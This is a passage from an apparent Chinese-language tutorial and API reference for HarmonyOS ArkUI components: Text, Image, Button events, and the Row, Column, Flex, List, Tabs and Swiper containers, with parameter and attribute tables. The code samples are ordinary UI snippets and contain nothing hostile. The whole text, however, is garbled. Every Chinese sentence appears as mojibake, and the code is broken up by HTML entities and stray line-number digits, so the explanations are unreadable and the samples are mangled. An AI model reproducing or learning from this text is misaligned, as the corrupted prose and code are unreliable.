2&#x27;)&#125; æœ‰å‚æ•°å¦‚æœç»„ä»¶çš„æ¥å£å®šä¹‰åŒ…å«æ„é€ å‚æ•°ï¼Œåˆ™åœ¨ç»„ä»¶åé¢çš„â€œ()â€é…ç½®ç›¸åº”å‚æ•°ã€‚Imageç»„ä»¶çš„å¿…é€‰å‚æ•°srcã€‚ 1Image(&#x27;https://xyz/test.jpg&#x27;) Textç»„ä»¶çš„éå¿…é€‰å‚æ•°contentã€‚ 123456// stringç±»å‹çš„å‚æ•°Text(&#x27;test&#x27;)// $rå½¢å¼å¼•å…¥åº”ç”¨èµ„æºï¼Œå¯åº”ç”¨äºå¤šè¯­è¨€åœºæ™¯Text($r(&#x27;app.string.title_value&#x27;))// æ— å‚æ•°å½¢å¼Text() å˜é‡æˆ–è¡¨è¾¾å¼ä¹Ÿå¯ä»¥ç”¨äºå‚æ•°èµ‹å€¼ï¼Œå…¶ä¸­è¡¨è¾¾å¼è¿”å›çš„ç»“æœç±»å‹å¿…é¡»æ»¡è¶³å‚æ•°ç±»å‹è¦æ±‚ã€‚ä¾‹å¦‚ï¼Œè®¾ç½®å˜é‡æˆ–è¡¨è¾¾å¼æ¥æ„é€ Imageå’ŒTextç»„ä»¶çš„å‚æ•°ã€‚ 123Image(this.imagePath)Image(&#x27;https://&#x27; + this.imageUrl)Text(`count: $&#123;this.count&#125;`) é…ç½®å±æ€§å±æ€§æ–¹æ³•ä»¥â€œ.â€é“¾å¼è°ƒç”¨çš„æ–¹å¼é…ç½®ç³»ç»Ÿç»„ä»¶çš„æ ·å¼å’Œå…¶ä»–å±æ€§ï¼Œå»ºè®®æ¯ä¸ªå±æ€§æ–¹æ³•å•ç‹¬å†™ä¸€è¡Œã€‚é…ç½®Textç»„ä»¶çš„å­—ä½“å¤§å°ã€‚ 12Text(&#x27;test&#x27;).fontSize(12) é…ç½®ç»„ä»¶çš„å¤šä¸ªå±æ€§ã€‚ 1234Image(&#x27;test.jpg&#x27;).alt(&#x27;error.jpg&#x27;).width(100).height(100) é™¤äº†ç›´æ¥ä¼ é€’å¸¸é‡å‚æ•°å¤–ï¼Œè¿˜å¯ä»¥ä¼ é€’å˜é‡æˆ–è¡¨è¾¾å¼ã€‚ 12345Text(&#x27;hello&#x27;).fontSize(this.size)Image(&#x27;test.jpg&#x27;).width(this.count % 2 === 0 ? 100 : 200).height(this.offset + 100) å¯¹äºç³»ç»Ÿç»„ä»¶ï¼ŒArkUIè¿˜ä¸ºå…¶å±æ€§é¢„å®šä¹‰äº†ä¸€äº›æšä¸¾ç±»å‹ä¾›å¼€å‘è€…è°ƒç”¨ï¼Œæšä¸¾ç±»å‹å¯ä»¥ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œä½†å¿…é¡»æ»¡è¶³å‚æ•°ç±»å‹è¦æ±‚ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥æŒ‰ä»¥ä¸‹æ–¹å¼é…ç½®Textç»„ä»¶çš„é¢œè‰²å’Œå­—ä½“æ ·å¼ã€‚ 12345Text(&#x27;hello&#x27;).fontSize(20).fontColor(Color.Red).fontWeight(FontWeight.Bold) é…ç½®äº‹ä»¶äº‹ä»¶æ–¹æ³•ä»¥â€œ.â€é“¾å¼è°ƒç”¨çš„æ–¹å¼é…ç½®ç³»ç»Ÿç»„ä»¶æ”¯æŒçš„äº‹ä»¶ï¼Œå»ºè®®æ¯ä¸ªäº‹ä»¶æ–¹æ³•å•ç‹¬å†™ä¸€è¡Œã€‚ä½¿ç”¨ç®­å¤´å‡½æ•°é…ç½®ç»„ä»¶çš„äº‹ä»¶æ–¹æ³•ã€‚ 12345Button(&#x27;Click me&#x27;).onClick(() =&gt; &#123; this.myText = &#x27;ArkUI&#x27;;&#125;) ä½¿ç”¨åŒ¿åå‡½æ•°è¡¨è¾¾å¼é…ç½®ç»„ä»¶çš„äº‹ä»¶æ–¹æ³•ï¼Œè¦æ±‚ä½¿ç”¨bindï¼Œä»¥ç¡®ä¿å‡½æ•°ä½“ä¸­çš„thisæŒ‡å‘å½“å‰ç»„ä»¶ã€‚ä½¿ç”¨ç»„ä»¶çš„æˆå‘˜å‡½æ•°é…ç½®ç»„ä»¶çš„äº‹ä»¶æ–¹æ³•ã€‚ 12345Button(&#x27;add counter&#x27;).onClick(function()&#123; this.counter += 2;&#125;.bind(this)) ä½¿ç”¨å£°æ˜çš„ç®­å¤´å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä¸éœ€è¦bind thisã€‚ é…ç½®å­ç»„ä»¶å¦‚æœç»„ä»¶æ”¯æŒå­ç»„ä»¶é…ç½®ï¼Œåˆ™éœ€åœ¨å°¾éšé—­åŒ…â€{â€¦}â€ä¸­ä¸ºç»„ä»¶æ·»åŠ å­ç»„ä»¶çš„UIæè¿°ã€‚Columnã€Rowã€Stackã€Gridã€Listç­‰ç»„ä»¶éƒ½æ˜¯å®¹å™¨ç»„ä»¶ã€‚ä»¥ä¸‹æ˜¯ç®€å•çš„Columnç»„ä»¶é…ç½®å­ç»„ä»¶çš„ç¤ºä¾‹ã€‚ 12345678Column() &#123; Text(&#x27;Hello&#x27;) .fontSize(100)Divider() Text(this.myText) .fontSize(100) .fontColor(Color.Red)&#125; å®¹å™¨ç»„ä»¶å‡æ”¯æŒå­ç»„ä»¶é…ç½®ï¼Œå¯ä»¥å®ç°ç›¸å¯¹å¤æ‚çš„å¤šçº§åµŒå¥—ã€‚ 123456789101112column() &#123; Row() &#123; Image(&#x27;test1.jpg&#x27;) .width(100) .height(100) Button(&#x27;click +1&#x27;) .onClick(() =&gt; &#123; console.info(&#x27;+1 clicked!&#x27;); &#125;) &#125;&#125; ğŸ±ç»„ä»¶Rowæ²¿æ°´å¹³æ–¹å‘å¸ƒå±€å®¹å™¨ã€‚å¯ä»¥åŒ…å«å­ç»„ä»¶ã€‚ 1Row(value?:&#123;space?: string | number&#125;) å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« é»˜è®¤å€¼ å‚æ•°æè¿° space string | number å¦ 0 æ¨ªå‘å¸ƒå±€å…ƒç´ é—´è·ã€‚ å±æ€§ï¼š åç§° å‚æ•°ç±»å‹ é»˜è®¤å€¼ æè¿° alignItems VerticalAlign VerticalAlign.Center åœ¨å‚ç›´æ–¹å‘ä¸Šå­ç»„ä»¶çš„å¯¹é½æ ¼å¼ã€‚ justifyContent FlexAlign FlexAlign.Start è®¾ç½®å­ç»„ä»¶åœ¨æ°´å¹³æ–¹å‘ä¸Šçš„å¯¹é½æ ¼å¼ã€‚ Columnæ²¿å‚ç›´æ–¹å‘å¸ƒå±€çš„å®¹å™¨ã€‚å¯ä»¥åŒ…å«å­ç»„ä»¶ã€‚ 1Column(value?:&#123;space?: string | number&#125;) å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« é»˜è®¤å€¼ å‚æ•°æè¿° space string|number å¦ 0 çºµå‘å¸ƒå±€å…ƒç´ é—´è·ã€‚ å±æ€§ï¼š åç§° å‚æ•°ç±»å‹ é»˜è®¤å€¼ æè¿° alignItems HorizontalAlign HorizontalAlign.Center è®¾ç½®å­ç»„ä»¶åœ¨æ°´å¹³æ–¹å‘ä¸Šçš„å¯¹é½æ ¼å¼ã€‚ justifyContent8+ FlexAlign FlexAlign.Start è®¾ç½®å­ç»„ä»¶åœ¨å‚ç›´æ–¹å‘ä¸Šçš„å¯¹é½æ ¼å¼ã€‚ Flexä»¥å¼¹æ€§æ–¹å¼å¸ƒå±€å­ç»„ä»¶çš„å®¹å™¨ç»„ä»¶ã€‚å­ç»„ä»¶ å¯ä»¥åŒ…å«å­ç»„ä»¶ã€‚ 12345Flex(value?: &#123; direction?: FlexDirection, wrap?: FlexWrap, justifyContent?: FlexAlign, alignItems?: ItemAlign, alignContent?: FlexAlign &#125;) å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« é»˜è®¤å€¼ å‚æ•°æè¿° direction FlexDirection å¦ FlexDirection.Row å­ç»„ä»¶åœ¨Flexå®¹å™¨ä¸Šæ’åˆ—çš„æ–¹å‘ï¼Œå³ä¸»è½´çš„æ–¹å‘ã€‚ wrap FlexWrap å¦ FlexWrap.NoWrap Flexå®¹å™¨æ˜¯å•è¡Œ/åˆ—è¿˜æ˜¯å¤šè¡Œ/ åˆ—æ’åˆ—ã€‚ justifyContent FlexAlign å¦ FlexAlign.Start å­ç»„ä»¶åœ¨Flexå®¹å™¨ä¸»è½´ä¸Šçš„å¯¹é½æ ¼å¼ã€‚ alignItems ItemAlign å¦ ItemAlign.Stretch å­ç»„ä»¶åœ¨Flexå®¹å™¨äº¤å‰è½´ä¸Šçš„å¯¹é½æ ¼å¼ã€‚ alignContent FlexAlign å¦ FlexAlign.Start äº¤å‰è½´ä¸­æœ‰é¢å¤–çš„ç©ºé—´æ—¶ï¼Œå¤šè¡Œå†…å®¹çš„å¯¹é½æ–¹å¼ã€‚ä»…åœ¨ wrapä¸ºWrapæˆ– WrapReverseä¸‹ç”Ÿæ•ˆã€‚ Liståˆ—è¡¨åŒ…å«ä¸€ç³»åˆ—ç›¸åŒå®½åº¦çš„åˆ—è¡¨é¡¹ã€‚é€‚åˆè¿ç»­ã€å¤šè¡Œå‘ˆç°åŒç±»æ•°æ®ï¼Œä¾‹å¦‚å›¾ç‰‡å’Œæ–‡æœ¬ã€‚ 1234List(value?:&#123;space?: number | string, initialIndex?: number, scroller?: Scroller&#125;) å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« å‚æ•°æè¿° space number | string å¦ åˆ—è¡¨é¡¹é—´è·ã€‚é»˜è®¤å€¼ï¼š0 initialIndex number å¦ è®¾ç½®å½“å‰Liståˆæ¬¡åŠ è½½æ—¶è§†å£èµ·å§‹ä½ç½®æ˜¾ç¤ºçš„itemçš„ç´¢å¼•å€¼ã€‚å¦‚æœè®¾ç½®çš„å€¼è¶…è¿‡äº†å½“å‰Liståä¸€ä¸ªitemçš„ç´¢å¼•å€¼ï¼Œåˆ™è®¾ç½®ä¸ç”Ÿæ•ˆã€‚é»˜è®¤å€¼ï¼š0 scroller Scroller å¦ å¯æ»šåŠ¨ç»„ä»¶çš„æ§åˆ¶å™¨ã€‚ç”¨äºä¸å¯æ»šåŠ¨ç»„ä»¶è¿›è¡Œç»‘å®šã€‚ å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° listDirection Axis è®¾ç½®Listç»„ä»¶æ’åˆ—æ–¹å‘å‚ç…§Axisæšä¸¾è¯´æ˜ã€‚é»˜è®¤å€¼ï¼šVertical divider {strokeWidth: Length,color?: ResourceColor,startMargin?: Length,endMargin?: Length} | null ç”¨äºè®¾ç½®ListItemåˆ†å‰²çº¿æ ·å¼ï¼Œé»˜è®¤æ— åˆ†å‰²çº¿ã€‚strokeWidth: åˆ†å‰²çº¿çš„çº¿å®½ã€‚ color: åˆ†å‰²çº¿çš„é¢œè‰²ã€‚startMarginï¼š åˆ†å‰²çº¿ä¸åˆ—è¡¨ä¾§è¾¹èµ·å§‹ç«¯çš„è·ç¦»ã€‚ endMargin: åˆ†å‰²çº¿ä¸åˆ—è¡¨ä¾§è¾¹ç»“æŸç«¯çš„è·ç¦»ã€‚ scrollBar BarState è®¾ç½®æ»šåŠ¨æ¡çŠ¶æ€ã€‚é»˜è®¤å€¼ï¼šBarState.Off cachedCount number è®¾ç½®é¢„åŠ è½½çš„ListItemçš„æ•°é‡ã€‚å…·ä½“ä½¿ç”¨å¯å‚è€ƒå‡å°‘åº”ç”¨ç™½å—è¯´æ˜ã€‚é»˜è®¤å€¼ï¼š1 editMode boolean å£°æ˜å½“å‰Listç»„ä»¶æ˜¯å¦å¤„äºå¯ç¼–è¾‘æ¨¡å¼ã€‚ é»˜è®¤å€¼ï¼šfalse edgeEffect EdgeEffect æ»‘åŠ¨æ•ˆæœï¼Œç›®å‰æ”¯æŒçš„æ»‘åŠ¨æ•ˆæœå‚è§ EdgeEffectçš„æšä¸¾è¯´æ˜ã€‚é»˜è®¤å€¼ï¼š EdgeEffect.Spring chainAnimation boolean ç”¨äºè®¾ç½®å½“å‰listæ˜¯å¦å¯ç”¨é“¾å¼è”åŠ¨åŠ¨æ•ˆï¼Œå¼€å¯ååˆ—è¡¨æ»‘åŠ¨ä»¥åŠé¡¶éƒ¨å’Œåº•éƒ¨æ‹–æ‹½æ—¶ä¼šæœ‰é“¾å¼è”åŠ¨çš„æ•ˆæœã€‚é“¾å¼è”åŠ¨æ•ˆæœï¼šlistå†…çš„list-itemé—´éš”ä¸€å®šè·ç¦»ï¼Œåœ¨åŸºæœ¬çš„æ»‘åŠ¨äº¤äº’è¡Œä¸ºä¸‹ï¼Œä¸»åŠ¨å¯¹è±¡é©±åŠ¨ä»åŠ¨å¯¹è±¡è¿›è¡Œè”åŠ¨ï¼Œé©±åŠ¨æ•ˆæœéµå¾ªå¼¹ç°§ç‰©ç†åŠ¨æ•ˆã€‚- falseï¼šä¸å¯ç”¨é“¾å¼è”åŠ¨ã€‚trueï¼šå¯ç”¨é“¾å¼è”åŠ¨ã€‚é»˜è®¤å€¼ï¼šfalse multiSelectable 8+ boolean æ˜¯å¦å¼€å¯é¼ æ ‡æ¡†é€‰ã€‚&gt;é»˜è®¤å€¼ï¼šfalsefalseï¼šå…³é—­æ¡†é€‰ã€‚- trueï¼šå¼€å¯æ¡†é€‰ã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onItemDelete(event: (index: number) =&gt; boolean) åˆ—è¡¨é¡¹åˆ é™¤æ—¶è§¦å‘ã€‚ onScroll(event: (scrollOffset: number, scrollState: ScrollState) =&gt; void) åˆ—è¡¨æ»‘åŠ¨æ—¶è§¦å‘ï¼Œè¿”å›å€¼scrollOffsetä¸ºæ»‘åŠ¨åç§»é‡ï¼Œ scrollStateä¸ºå½“å‰æ»‘åŠ¨çŠ¶æ€ã€‚ onScrollIndex(event: (start: number, end: number) =&gt; void) åˆ—è¡¨æ»‘åŠ¨æ—¶è§¦å‘ï¼Œè¿”å›å€¼åˆ†åˆ«ä¸ºæ»‘åŠ¨èµ·å§‹ä½ç½®ç´¢å¼•å€¼ä¸æ»‘åŠ¨ç»“æŸä½ç½®ç´¢å¼•å€¼ã€‚ onReachStart(event: () =&gt; void) åˆ—è¡¨åˆ°è¾¾èµ·å§‹ä½ç½®æ—¶è§¦å‘ã€‚ onReachEnd(event: () =&gt; void) åˆ—è¡¨åˆ°åº•æœ«å°¾ä½ç½®æ—¶è§¦å‘ã€‚ onScrollStop(event: () =&gt; void) åˆ—è¡¨æ»‘åŠ¨åœæ­¢æ—¶è§¦å‘ã€‚ onItemMove(event: (from: number, to: number) =&gt; boolean) åˆ—è¡¨å…ƒç´ å‘ç”Ÿç§»åŠ¨æ—¶è§¦å‘ï¼Œè¿”å›å€¼fromã€toåˆ†åˆ«ä¸ºç§»åŠ¨å‰ç´¢å¼•å€¼ä¸ç§»åŠ¨åç´¢å¼•å€¼ã€‚ onItemDragStart(event: (event: ItemDragInfo, itemIndex: number) =&gt; ((() =&gt; any) | void)) å¼€å§‹æ‹–æ‹½åˆ—è¡¨å…ƒç´ æ—¶è§¦å‘ï¼Œè¿”å›å€¼eventè§ItemDragInfoå¯¹è±¡è¯´æ˜ï¼ŒitemIndexä¸ºè¢«æ‹–æ‹½åˆ—è¡¨å…ƒç´ ç´¢å¼•å€¼ã€‚ onItemDragEnter(event: (event: ItemDragInfo) =&gt; void) æ‹–æ‹½è¿›å…¥åˆ—è¡¨å…ƒç´ èŒƒå›´å†…æ—¶è§¦å‘ï¼Œè¿”å›å€¼eventè§ ItemDragInfoå¯¹è±¡è¯´æ˜ã€‚ onItemDragMove(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number) =&gt; void) æ‹–æ‹½åœ¨åˆ—è¡¨å…ƒç´ èŒƒå›´å†…ç§»åŠ¨æ—¶è§¦å‘ï¼Œè¿”å›å€¼eventè§ ItemDragInfoå¯¹è±¡è¯´æ˜ï¼ŒitemIndexä¸ºæ‹–æ‹½èµ·å§‹ä½ç½®ï¼Œ insertIndexä¸ºæ‹–æ‹½æ’å…¥ä½ç½®ã€‚ onItemDragLeave(event: (event: ItemDragInfo, itemIndex: number) =&gt; void) æ‹–æ‹½ç¦»å¼€åˆ—è¡¨å…ƒç´ æ—¶è§¦å‘ï¼Œè¿”å›å€¼eventè§ItemDragInfoå¯¹è±¡è¯´æ˜ï¼ŒitemIndexä¸ºæ‹–æ‹½ç¦»å¼€çš„åˆ—è¡¨å…ƒç´ ç´¢å¼•å€¼ã€‚ onItemDrop(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number, isSuccess: boolean) =&gt; void) ç»‘å®šè¯¥äº‹ä»¶çš„åˆ—è¡¨å…ƒç´ å¯ä½œä¸ºæ‹–æ‹½é‡Šæ”¾ç›®æ ‡ï¼Œå½“åœ¨åˆ—è¡¨å…ƒç´  å†…åœæ­¢æ‹–æ‹½æ—¶è§¦å‘ï¼Œè¿”å›å€¼eventè§ItemDragInfoå¯¹è±¡è¯´æ˜ï¼Œ itemIndexä¸ºæ‹–æ‹½èµ·å§‹ä½ç½®ï¼ŒinsertIndexä¸ºæ‹–æ‹½æ’å…¥ä½ç½®ï¼Œ isSuccessä¸ºæ˜¯å¦æˆåŠŸé‡Šæ”¾ã€‚ ScrollStateæšä¸¾è¯´æ˜ åç§° æè¿° Idle æœªæ»‘åŠ¨çŠ¶æ€ã€‚ Scroll æƒ¯æ€§æ»‘åŠ¨çŠ¶æ€ã€‚ Fling æ‰‹æŒ‡æ‹–åŠ¨çŠ¶æ€ã€‚ ListItemç”¨æ¥å±•ç¤ºåˆ—è¡¨å…·ä½“itemï¼Œå¿…é¡»é…åˆListæ¥ä½¿ç”¨ã€‚ 12ListItem(value?: string) å±æ€§ åç§° å‚æ•°ç±»å‹ é»˜è®¤å€¼ æè¿° sticky Sticky Sticky.None è®¾ç½®ListItemå¸é¡¶æ•ˆæœï¼Œå‚è§Stickyæšä¸¾æè¿°ã€‚é»˜è®¤å€¼ï¼šSticky.None editable boolean | EditMode false å½“å‰ListItemå…ƒç´ æ˜¯å¦å¯ç¼–è¾‘ï¼Œè¿›å…¥ç¼–è¾‘æ¨¡å¼åå¯åˆ é™¤æˆ–ç§»åŠ¨ã€‚é»˜è®¤å€¼ï¼šfalse selectable 8+ boolean true å½“å‰ListItemå…ƒç´ æ˜¯å¦å¯ä»¥è¢«é¼ æ ‡æ¡†é€‰ã€‚é»˜è®¤å€¼ï¼štrueè¯´æ˜ï¼šå¤–å±‚Listå®¹å™¨çš„é¼ æ ‡æ¡†é€‰å¼€å¯æ—¶ï¼ŒListItemçš„æ¡†é€‰æ‰ç”Ÿæ•ˆã€‚ Stickyæšä¸¾è¯´æ˜ åç§° æè¿° None æ— å¸é¡¶æ•ˆæœã€‚ Normal å½“å‰itemå¸é¡¶ã€‚ Opacity å½“å‰itemå¸é¡¶æ˜¾ç¤ºé€æ˜åº¦å˜åŒ–æ•ˆæœã€‚ EditModeæšä¸¾è¯´æ˜ åç§° æè¿° None ç¼–è¾‘æ“ä½œä¸é™åˆ¶ã€‚ Deletable å¯åˆ é™¤ã€‚ Movable å¯ç§»åŠ¨ã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onSelect(event: (isSelected: boolean) =&gt; void) 8+ ListItemå…ƒç´ è¢«é¼ æ ‡æ¡†é€‰çš„çŠ¶æ€æ”¹å˜æ—¶è§¦å‘å›è°ƒã€‚isSelectedï¼šè¿›å…¥é¼ æ ‡æ¡†é€‰èŒƒå›´å³è¢«é€‰ä¸­è¿”å›trueï¼Œ ç§»å‡ºé¼ æ ‡æ¡†é€‰èŒƒå›´å³æœªè¢«é€‰ä¸­è¿”å› falseã€‚ 123456789101112131415161718List() &#123; ListItem() &#123; Row() &#123; Image($r(&#x27;app.media.icon&#x27;)).width(&#x27;80vp&#x27;) Column() &#123; Text(&#x27;æ ‡é¡Œ&#x27;) .fontColor(Color.Blue) .fontSize(&#x27;22fp&#x27;) Text(&#x27;æè¿°&#x27;) .fontColor(Color.Gray) .fontSize(&#x27;22fp&#x27;) &#125; &#125; .padding(&#123;left:&#x27;10vp&#x27;&#125;) &#125; &#125; .backgroundColor(Color.White) â€‹ Tabs é€šè¿‡é¡µç­¾è¿›è¡Œå†…å®¹è§†å›¾åˆ‡æ¢çš„å®¹å™¨ç»„ä»¶ï¼Œæ¯ä¸ªé¡µç­¾å¯¹åº”ä¸€ä¸ªå†…å®¹è§†å›¾ã€‚ 123Tabs(value?: &#123;barPosition?: BarPosition, index?: number, controller?: TabsController&#125;) å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« é»˜è®¤å€¼ å‚æ•°æè¿° barPosition BarPosition å¦ BarPosition.Start æŒ‡å®šé¡µç­¾ä½ç½®æ¥åˆ›å»ºTabså®¹å™¨ç»„ä»¶ã€‚ index number å¦ 0 æŒ‡å®šåˆæ¬¡åˆå§‹é¡µç­¾ç´¢å¼•ã€‚ controller TabsController å¦ - è®¾ç½®Tabsæ§åˆ¶å™¨ã€‚ BarPositionæšä¸¾è¯´æ˜ åç§° æè¿° Start verticalå±æ€§æ–¹æ³•è®¾ç½®ä¸ºtrueæ—¶ï¼Œé¡µç­¾ä½äºå®¹å™¨å·¦ä¾§ï¼›verticalå±æ€§æ–¹æ³•è®¾ç½®ä¸ºfalseæ—¶ï¼Œé¡µç­¾ä½äºå®¹å™¨é¡¶éƒ¨ã€‚ End verticalå±æ€§æ–¹æ³•è®¾ç½®ä¸ºtrueæ—¶ï¼Œé¡µç­¾ä½äºå®¹å™¨å³ä¾§ï¼›verticalå±æ€§æ–¹æ³•è®¾ç½®ä¸ºfalseæ—¶ï¼Œé¡µç­¾ä½äºå®¹å™¨åº•éƒ¨ã€‚ å±æ€§ä¸æ”¯æŒè§¦æ‘¸çƒ­åŒºè®¾ç½®ã€‚ åç§° å‚æ•°ç±»å‹ é»˜è®¤å€¼ æè¿° vertical boolean false è®¾ç½®ä¸ºfalseæ˜¯ä¸ºæ¨ªå‘Tabsï¼Œè®¾ç½®ä¸º trueæ—¶ä¸ºçºµå‘Tabsã€‚ scrollable boolean true è®¾ç½®ä¸ºtrueæ—¶å¯ä»¥é€šè¿‡æ»‘åŠ¨é¡µé¢è¿›è¡Œé¡µé¢åˆ‡æ¢ï¼Œä¸ºfalseæ—¶ä¸å¯æ»‘åŠ¨åˆ‡æ¢é¡µé¢ã€‚ barMode BarMode BarMode.Fixed TabBarå¸ƒå±€æ¨¡å¼ï¼Œå…·ä½“æè¿°è§ BarModeæšä¸¾è¯´æ˜ã€‚ barWidth Length - TabBarçš„å®½åº¦å€¼ã€‚ barHeight Length - TabBarçš„é«˜åº¦å€¼ã€‚ animationDuration number 200 TabContentæ»‘åŠ¨åŠ¨ç”»æ—¶é•¿ã€‚ BarModeæšä¸¾è¯´æ˜ åç§° æè¿° Scrollable TabBarä½¿ç”¨å®é™…å¸ƒå±€å®½åº¦, è¶…è¿‡æ€»é•¿åº¦åå¯æ»‘åŠ¨ã€‚ Fixed æ‰€æœ‰TabBarå¹³å‡åˆ†é…å®½åº¦ã€‚ äº‹ä»¶ åç§° åŠŸèƒ½æè¿° onChange(event: (index: number) =&gt; void) Tabé¡µç­¾åˆ‡æ¢åè§¦å‘çš„äº‹ä»¶ã€‚- index: tabæ ‡ç­¾çš„ç´¢å¼•å€¼ã€‚ TabsController Tabsç»„ä»¶çš„æ§åˆ¶å™¨ï¼Œç”¨äºæ§åˆ¶Tabsç»„ä»¶è¿›è¡Œé¡µç­¾åˆ‡æ¢ã€‚å¯¼å…¥å¯¹è±¡ 12controller: TabsController = new TabsController() changeIndex changeIndex(value: number): void æ§åˆ¶Tabsåˆ‡æ¢åˆ°æŒ‡å®šé¡µç­¾ã€‚å‚æ•°ï¼š å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« é»˜è®¤å€¼ å‚æ•°æè¿° value number æ˜¯ - é¡µç­¾åœ¨Tabsé‡Œçš„ç´¢å¼•å€¼ï¼Œç´¢å¼•å€¼ä»0å¼€å§‹ã€‚ TabContentä»…åœ¨Tabsä¸­ä½¿ç”¨ï¼Œå¯¹åº”ä¸€ä¸ªåˆ‡æ¢é¡µç­¾çš„å†…å®¹è§†å›¾ã€‚ 1TabContent() å±æ€§ åç§° å‚æ•°ç±»å‹ é»˜è®¤å€¼ æè¿° tabBar string | Resource| {icon?: string | Resource,text?: string | Resource}| CustomBuilder8+ - è®¾ç½®TabBarä¸Šæ˜¾ç¤ºå†…å®¹ã€‚CustomBuilder: æ„é€ å™¨ï¼Œå†…éƒ¨å¯ä»¥ä¼ å…¥ç»„ä»¶ï¼ˆAPI8ç‰ˆæœ¬ä»¥ä¸Šé€‚ç”¨ï¼‰ã€‚è¯´æ˜ï¼šå¦‚æœ iconé‡‡ç”¨svgæ ¼å¼å›¾æºï¼Œåˆ™è¦æ±‚svgå›¾æºåˆ é™¤å…¶è‡ªæœ‰å®½é«˜å±æ€§å€¼ã€‚å¦‚é‡‡ç”¨å¸¦æœ‰è‡ªæœ‰å®½é«˜å±æ€§çš„svgå›¾æºï¼Œiconå¤§å°åˆ™æ˜¯svgæœ¬èº«å†…ç½®çš„å®½é«˜å±æ€§å€¼å¤§å°ã€‚ Swiperæ»‘å—è§†å›¾å®¹å™¨ï¼Œæä¾›å­ç»„ä»¶æ»‘åŠ¨è½®æ’­æ˜¾ç¤ºçš„èƒ½åŠ›ã€‚å‚æ•° å‚æ•°å å‚æ•°ç±»å‹ å¿…å¡« å‚æ•°æè¿° controller SwiperController å¦ ç»™ç»„ä»¶ç»‘å®šä¸€ä¸ªæ§åˆ¶å™¨ï¼Œç”¨æ¥æ§åˆ¶ç»„ä»¶ç¿»é¡µã€‚ å±æ€§ åç§° å‚æ•°ç±»å‹ æè¿° index number è®¾ç½®å½“å‰åœ¨å®¹å™¨ä¸­æ˜¾ç¤ºçš„å­ç»„ä»¶çš„ç´¢å¼•å€¼ã€‚é»˜è®¤å€¼ï¼š0 autoPlay boolean å­ç»„ä»¶æ˜¯å¦è‡ªåŠ¨æ’­æ”¾ï¼Œè‡ªåŠ¨æ’­æ”¾çŠ¶æ€ä¸‹ï¼Œå¯¼èˆªç‚¹ä¸å¯æ“ä½œã€‚é»˜è®¤å€¼ï¼šfalse interval number ä½¿ç”¨è‡ªåŠ¨æ’­æ”¾æ—¶æ’­æ”¾çš„æ—¶é—´é—´éš”ï¼Œå•ä½ä¸ºæ¯«ç§’ã€‚é»˜è®¤å€¼ï¼š3000 indicator boolean æ˜¯å¦å¯ç”¨å¯¼èˆªç‚¹æŒ‡ç¤ºå™¨ã€‚é»˜è®¤å€¼ï¼štrue loop boolean æ˜¯å¦å¼€å¯å¾ªç¯ã€‚è®¾ç½®ä¸ºtrueæ—¶è¡¨ç¤ºå¼€å¯å¾ªç¯ï¼Œåœ¨LazyForEachæ‡’å¾ªç¯åŠ è½½æ¨¡å¼ ä¸‹ï¼ŒåŠ è½½çš„ç»„ä»¶æ•°é‡å»ºè®®å¤§äº5ä¸ªã€‚é»˜è®¤å€¼ï¼štrue duration number å­ç»„ä»¶åˆ‡æ¢çš„åŠ¨ç”»æ—¶é•¿ï¼Œå•ä½ä¸ºæ¯«ç§’ã€‚ é»˜è®¤å€¼ï¼š400 vertical boolean æ˜¯å¦ä¸ºçºµå‘æ»‘åŠ¨ã€‚é»˜è®¤å€¼ï¼šfalse itemSpace number | string è®¾ç½®å­ç»„ä»¶ä¸å­ç»„ä»¶ä¹‹é—´é—´éš™ã€‚é»˜è®¤å€¼ï¼š0 displayMode SwiperDisplayMode è®¾ç½®å­ç»„ä»¶æ˜¾ç¤ºæ¨¡å¼ã€‚é»˜è®¤å€¼ï¼š SwiperDisplayMode.Stretch cachedCount 8+ number è®¾ç½®é¢„åŠ è½½å­ç»„ä»¶ä¸ªæ•°ã€‚é»˜è®¤å€¼ï¼š1 disableSwipe 8+ boolean ç¦ç”¨ç»„ä»¶æ»‘åŠ¨åˆ‡æ¢åŠŸèƒ½ã€‚é»˜è®¤å€¼ï¼šfalse displayCount 8+ number | string è®¾ç½®ä¸€é¡µä¸­æ˜¾ç¤ºå­ç»„ä»¶çš„ä¸ªæ•°ï¼Œè®¾ç½®ä¸º â€œautoâ€æ—¶ç­‰åŒäº SwiperDisplayMode.AutoLinearçš„æ˜¾ç¤º æ•ˆæœã€‚é»˜è®¤å€¼ï¼š1 effectMode 8+ EdgeEffect è®¾ç½®æ»‘åŠ¨åˆ°è¾¹ç¼˜æ—¶çš„æ˜¾ç¤ºæ•ˆæœã€‚é»˜è®¤å€¼ï¼šEdgeEffect.Spring curve 8+ Curve | string è®¾ç½®Swiperçš„åŠ¨ç”»æ›²çº¿ï¼Œé»˜è®¤ä¸ºæ·¡å…¥æ·¡å‡ºæ›²çº¿ indicatorStyle 8+ {left?: Length,top?: Length,right?: Length,bottom?: Length,size?: Length,mask?: boolean,color?: ResourceColor,selectedColor?: ResourceColor} è®¾ç½®å¯¼èˆªç‚¹æ ·å¼ï¼š- left: è®¾ç½®å¯¼èˆªç‚¹è·ç¦» Swiperç»„ä»¶å·¦è¾¹çš„è·ç¦»ã€‚- top: è®¾ç½®å¯¼ èˆªç‚¹è·ç¦»Swiperç»„ä»¶é¡¶éƒ¨çš„è·ç¦»ã€‚right: è®¾ç½®å¯¼èˆªç‚¹è·ç¦»Swiperç»„ä»¶å³è¾¹çš„è·ç¦»ã€‚- bottom: è®¾ç½®å¯¼èˆªç‚¹è·ç¦» Swiperç»„ä»¶åº•éƒ¨çš„è·ç¦»ã€‚- size: 